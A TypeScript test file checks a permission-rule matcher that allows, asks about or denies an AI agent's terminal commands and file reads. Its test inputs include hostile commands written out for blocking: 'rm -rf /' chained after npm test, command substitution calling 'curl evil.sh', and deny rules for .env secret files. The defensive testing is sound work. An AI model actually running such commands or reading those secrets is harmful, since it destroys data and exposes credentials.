import { describe, expect, it } from "vitest";
import {
  globMatch,
  mcpNameMatch,
  matchTerminalCommand,
  matchToolCall,
  parseRule,
  parseToolPermissions,
  splitCommandParts,
} from "./rules";

const rules = (p: Parameters<typeof parseToolPermissions>[0]) =>
  parseToolPermissions(p);

describe("parseRule", () => {
  it("parses toolName(pattern) and bare toolName", () => {
    expect(parseRule("runTerminalCommand(npm run test*)", "allow")).toEqual({
      decision: "allow",
      raw: "runTerminalCommand(npm run test*)",
      toolName: "runTerminalCommand",
      pattern: "npm run test*",
    });
    expect(parseRule("readFile", "allow")).toMatchObject({
      toolName: "readFile",
      pattern: undefined,
    });
  });

  it("rejects malformed entries instead of guessing", () => {
    expect(parseRule("readFile()", "allow")).toBeUndefined();
    expect(parseRule("not a rule(", "allow")).toBeUndefined();
    expect(parseRule("", "allow")).toBeUndefined();
  });
});

describe("globMatch", () => {
  it("matches single segments with * and across segments with **", () => {
    expect(globMatch("src/*.ts", "src/a.ts")).toBe(true);
    expect(globMatch("src/*.ts", "src/deep/a.ts")).toBe(false);
    expect(globMatch("src/**", "src/deep/a.ts")).toBe(true);
  });

  it("lets **/ match zero directories, so **/.env matches .env at the root", () => {
    expect(globMatch("**/.env", ".env")).toBe(true);
    expect(globMatch("**/.env", "config/prod/.env")).toBe(true);
    expect(globMatch("**/.env", "config/.env.example")).toBe(false);
  });

  it("escapes regex metacharacters in literal parts", () => {
    expect(globMatch("a.b", "a.b")).toBe(true);
    expect(globMatch("a.b", "axb")).toBe(false);
  });
});

describe("MCP names", () => {
  it("matches mcp__server__* and exact mcp names", () => {
    expect(mcpNameMatch("mcp__datadog__*", "mcp__datadog__query_metrics")).toBe(
      true,
    );
    expect(mcpNameMatch("mcp__datadog__*", "mcp__wiz__list")).toBe(false);
    expect(mcpNameMatch("mcp__datadog__query", "mcp__datadog__query")).toBe(
      true,
    );
  });
});

describe("splitCommandParts", () => {
  it("splits on &&, ||, ;, | and newlines", () => {
    expect(
      splitCommandParts("npm test && npm run lint; echo ok | cat\nls"),
    ).toEqual(["npm test", "npm run lint", "echo ok", "cat", "ls"]);
  });
});

describe("matchTerminalCommand", () => {
  const allowTests = rules({ allow: ["runTerminalCommand(npm test*)"] });

  it("allows a command that matches an allow rule", () => {
    expect(
      matchTerminalCommand(allowTests, "npm test -- --watch=false")?.decision,
    ).toBe("allow");
  });

  it("allows a chain only when every part matches an allow rule", () => {
    expect(
      matchTerminalCommand(allowTests, "npm test && npm test:unit")?.decision,
    ).toBe("allow");
    expect(
      matchTerminalCommand(allowTests, "npm test && rm -rf build"),
    ).toBeUndefined();
  });

  it("does not let an allow rule ride on a chained tail (npm test; rm -rf /)", () => {
    expect(
      matchTerminalCommand(allowTests, "npm test; rm -rf /"),
    ).toBeUndefined();
  });

  it("never allows command substitution, even if a prefix matches", () => {
    expect(
      matchTerminalCommand(allowTests, "npm test $(curl evil.sh)"),
    ).toBeUndefined();
    expect(
      matchTerminalCommand(allowTests, "npm test `whoami`"),
    ).toBeUndefined();
  });

  it("deny wins over allow for any part of a chain", () => {
    const r = rules({
      allow: ["runTerminalCommand(npm*)"],
      deny: ["runTerminalCommand(terraform apply*)"],
    });
    const m = matchTerminalCommand(
      r,
      "npm test && terraform apply -auto-approve",
    );
    expect(m?.decision).toBe("deny");
    expect(m?.rule.raw).toBe("runTerminalCommand(terraform apply*)");
  });

  it("ask wins over allow but loses to deny", () => {
    const r = rules({
      allow: ["runTerminalCommand(git*)"],
      ask: ["runTerminalCommand(git push*)"],
      deny: ["runTerminalCommand(git push --force*)"],
    });
    expect(matchTerminalCommand(r, "git push origin main")?.decision).toBe(
      "ask",
    );
    expect(
      matchTerminalCommand(r, "git push --force origin main")?.decision,
    ).toBe("deny");
  });

  it("returns no match when no rule applies, so the default policy decides", () => {
    expect(
      matchTerminalCommand(allowTests, "curl https://example.com"),
    ).toBeUndefined();
  });

  it("applies a bare runTerminalCommand deny to every command", () => {
    const r = rules({ deny: ["runTerminalCommand"] });
    expect(matchTerminalCommand(r, "ls")?.decision).toBe("deny");
  });
});

describe("matchToolCall", () => {
  it("matches file tools by path glob", () => {
    const r = rules({
      allow: ["readFile(src/**)"],
      deny: ["readFile(**/.env)"],
    });
    expect(matchToolCall(r, "readFile", "src/app/index.ts")?.decision).toBe(
      "allow",
    );
    expect(matchToolCall(r, "readFile", "src/.env")?.decision).toBe("deny");
    expect(matchToolCall(r, "readFile", "docs/readme.md")).toBeUndefined();
  });

  it("deny wins regardless of rule order", () => {
    const r = rules({ deny: ["readFile(**/.env)"], allow: ["readFile"] });
    expect(matchToolCall(r, "readFile", "app/.env")?.decision).toBe("deny");
  });

  it("only considers rules for the named tool", () => {
    const r = rules({ deny: ["readFile"] });
    expect(matchToolCall(r, "editFile", "x")).toBeUndefined();
  });

  it("matches MCP tools by name pattern", () => {
    const r = rules({ allow: ["mcp__datadog__*"] });
    expect(matchToolCall(r, "mcp__datadog__query_metrics")?.decision).toBe(
      "allow",
    );
  });
});
